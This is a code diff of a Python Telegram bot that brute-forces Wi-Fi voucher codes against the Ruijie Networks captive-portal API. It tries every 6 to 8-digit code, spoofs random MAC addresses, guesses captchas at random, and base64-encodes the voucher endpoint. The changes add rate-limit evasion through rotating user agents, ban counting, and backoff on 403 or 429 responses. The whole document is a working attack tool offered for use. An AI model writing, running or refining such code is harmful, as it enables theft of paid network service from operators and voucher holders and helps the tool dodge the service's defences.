@@ -5,27 +5,30 @@ import random
 import re
 import time
 import base64
-import json
-from datetime import datetime
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
-# ── CONFIG ──────────────────────────────────────────────────────────────
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "8537971974"))
 
-BATCH_SIZE = 100
-MAX_CONCURRENT = 50
+# ── YOUR SETTINGS ──────────────────────────────────────────────────────
+BATCH_SIZE = 50
+MAX_CONCURRENT = 20
+DELAY_BETWEEN_REQUESTS = 0.1
 
 # ── GLOBALS ──────────────────────────────────────────────────────────────
 user_data = {}
 scanning_active = False
 found_codes = []
 stop_scan = False
-scan_task = None
+ban_count = 0
 session_url = None
 
-# ── HELPERS ──────────────────────────────────────────────────────────────
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+]
 
 def get_mac():
     return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))
@@ -33,11 +36,14 @@ def get_mac():
 def replace_mac(url, new_mac):
     return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
 
+def random_user_agent():
+    return random.choice(USER_AGENTS)
+
 async def get_session_id(session_obj, session_url, prev_sid=None):
     mac = get_mac()
     url = replace_mac(session_url, new_mac=mac)
     headers = {
-        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
+        'user-agent': random_user_agent(),
         'accept': 'text/html',
     }
     try:
@@ -49,7 +55,7 @@ async def get_session_id(session_obj, session_url, prev_sid=None):
 
 async def captcha_image(session_obj, session_id):
     params = {'sessionId': session_id, '_t': str(time.time())}
-    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'}
+    headers = {'user-agent': random_user_agent()}
     try:
         async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image',
                                    params=params, headers=headers, timeout=5) as req:
@@ -58,12 +64,11 @@ async def captcha_image(session_obj, session_id):
         return None
 
 async def captcha_text(image_bytes):
-    # Simple random CAPTCHA solver (since no OCR)
     return ''.join(random.choice('0123456789') for _ in range(4))
 
 async def verify_captcha(session_obj, session_id, text):
     json_data = {'sessionId': session_id, 'authCode': text}
-    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
+    headers = {'user-agent': random_user_agent(),
                'content-type': 'application/json'}
     try:
         async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
@@ -78,10 +83,7 @@ async def get_balance_info(session_id):
         f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}",
         f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}",
     ]
-    headers = {
-        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
-        'accept': 'application/json',
-    }
+    headers = {'user-agent': random_user_agent(), 'accept': 'application/json'}
     async with aiohttp.ClientSession() as temp_session:
         for url in endpoints:
             try:
@@ -102,6 +104,7 @@ async def get_balance_info(session_id):
     return ("📋 Unknown | ⏱ N/A", 0, "Unknown")
 
 async def perform_check(code, session_url, session_id_cache=None):
+    global ban_count
     post_url = base64.b64decode(
         b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
     ).decode()
@@ -135,7 +138,7 @@ async def perform_check(code, session_url, session_id_cache=None):
                 "authCode": text,
             }
             headers = {
-                "user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36",
+                "user-agent": random_user_agent(),
                 "content-type": "application/json",
                 "accept": "*/*",
             }
@@ -143,8 +146,16 @@ async def perform_check(code, session_url, session_id_cache=None):
             try:
                 async with task_session.post(post_url, json=data, headers=headers, timeout=8) as req:
                     response = await req.text()
-                    if 'request limited' in response:
+                    
+                    if req.status == 403 or req.status == 429:
+                        ban_count += 1
+                        await asyncio.sleep(3)
                         return None
+                    
+                    if 'request limited' in response:
+                        await asyncio.sleep(2)
+                        return None
+                    
                     if 'logonUrl' in response:
                         balance_display, balance_minutes, plan_name = await get_balance_info(session_id)
                         return {
@@ -162,8 +173,6 @@ async def perform_check(code, session_url, session_id_cache=None):
         return None
     return None
 
-# ── GENERATORS ──────────────────────────────────────────────────────────
-
 def iter_digit_codes(mode):
     length = int(mode)
     codes = [str(i).zfill(length) for i in range(10 ** length)]
@@ -175,19 +184,19 @@ def iter_digit_codes(mode):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🔥 Ruijie Scanner Bot (Render Edition)\n\n"
-        "/setup <url> - Session URL ထည့်ရန်\n"
+        "/input <url> - Session URL ထည့်ရန်\n"
         "/scan <6|7|8> - Scan စတင်ရန်\n"
         "/stop - Scan ရပ်ရန်\n"
         "/saved - တွေ့ရှိထားသော codes များကြည့်ရန်\n"
         "/status - Bot အခြေအနေကြည့်ရန်"
     )
 
-async def setup(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def input_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global session_url
     chat_id = update.effective_chat.id
     args = context.args
     if not args:
-        await update.message.reply_text("❌ /setup <session_url> ကို သုံးပါ")
+        await update.message.reply_text("❌ /input <session_url> ကို သုံးပါ")
         return
     url = args[0]
     if "ruijienetworks.com" not in url:
@@ -198,10 +207,10 @@ async def setup(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("✅ Session URL သိမ်းဆည်းပြီး")
 
 async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global scanning_active, found_codes, stop_scan, scan_task, session_url
+    global scanning_active, found_codes, stop_scan, ban_count
     chat_id = update.effective_chat.id
     if chat_id not in user_data:
-        await update.message.reply_text("❌ /setup ဖြင့် URL ထည့်ပါ")
+        await update.message.reply_text("❌ /input ဖြင့် URL ထည့်ပါ")
         return
     args = context.args
     if not args:
@@ -218,13 +227,14 @@ async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     scanning_active = True
     stop_scan = False
     found_codes = []
+    ban_count = 0
     session_url = user_data[chat_id]["session_url"]
     await update.message.reply_text(f"🚀 Scan စတင်ပြီ — Mode: {mode}-digit")
     
-    scan_task = asyncio.create_task(run_scan(update, context, mode, session_url))
+    asyncio.create_task(run_scan(update, context, mode, session_url))
 
 async def run_scan(update, context, mode, session_url):
-    global scanning_active, found_codes, stop_scan
+    global scanning_active, found_codes, stop_scan, ban_count
     chat_id = update.effective_chat.id
     
     try:
@@ -246,6 +256,7 @@ async def run_scan(update, context, mode, session_url):
     async def _check(code):
         nonlocal session_cache
         async with sem:
+            await asyncio.sleep(DELAY_BETWEEN_REQUESTS)
             result = await perform_check(code, session_url, session_cache)
             if result and result.get("session_id"):
                 session_cache = result.get("session_id")
@@ -298,13 +309,12 @@ async def run_scan(update, context, mode, session_url):
                         f"📦 Checked: {checked:,}/{total:,}\n"
                         f"📊 Progress: {progress:.1f}%\n"
                         f"⚡ Speed: {speed:,} codes/min\n"
-                        f"✅ Found: {found}"
+                        f"✅ Found: {found}\n"
+                        f"🚫 Ban: {ban_count}"
                     )
                 )
             except:
                 pass
-            
-            await asyncio.sleep(0.1)
     
     except Exception as e:
         await context.bot.send_message(chat_id, f"❌ Error: {e}")
@@ -332,15 +342,14 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"📊 Bot Status\n\n"
         f"🔍 Scan Active: {scanning_active}\n"
-        f"✅ Found Codes: {len(found_codes)}"
+        f"✅ Found Codes: {len(found_codes)}\n"
+        f"🚫 Ban Count: {ban_count}"
     )
-
-# ── MAIN ──────────────────────────────────────────────────────────────────
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("setup", setup))
+    app.add_handler(CommandHandler("input", input_command))
     app.add_handler(CommandHandler("scan", scan))
     app.add_handler(CommandHandler("stop", stop))
     app.add_handler(CommandHandler("saved", saved))
